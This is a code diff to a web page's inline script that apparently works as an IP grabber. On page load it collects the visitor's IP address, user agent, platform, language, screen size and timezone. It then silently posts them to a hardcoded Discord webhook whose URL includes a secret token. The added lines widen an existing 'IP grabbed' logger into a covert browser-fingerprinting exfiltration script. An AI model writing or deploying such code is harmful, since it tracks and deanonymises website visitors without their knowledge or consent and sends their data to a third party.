@@ -11,11 +11,29 @@
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
+        const browserInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
         const webhookURL = "https://discordapp.com/api/webhooks/1374439335784353842/bOzRgYIW_ZZvSkTuiWk-wiL-tkVklOo9wqgH2lkljXC41w3waBQutFo7Cgo5RxgpD_1W";
+
+        const content = `IP: ${ip}\n` +
+                        `User Agent: ${browserInfo.userAgent}\n` +
+                        `Platform: ${browserInfo.platform}\n` +
+                        `Language: ${browserInfo.language}\n` +
+                        `Cookies Enabled: ${browserInfo.cookiesEnabled}\n` +
+                        `Screen: ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
+                        `Timezone: ${browserInfo.timezone}`;
+
         fetch(webhookURL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `IP grabbed: ${ip}` })
+          body: JSON.stringify({ content: content })
         });
       });
   </script>
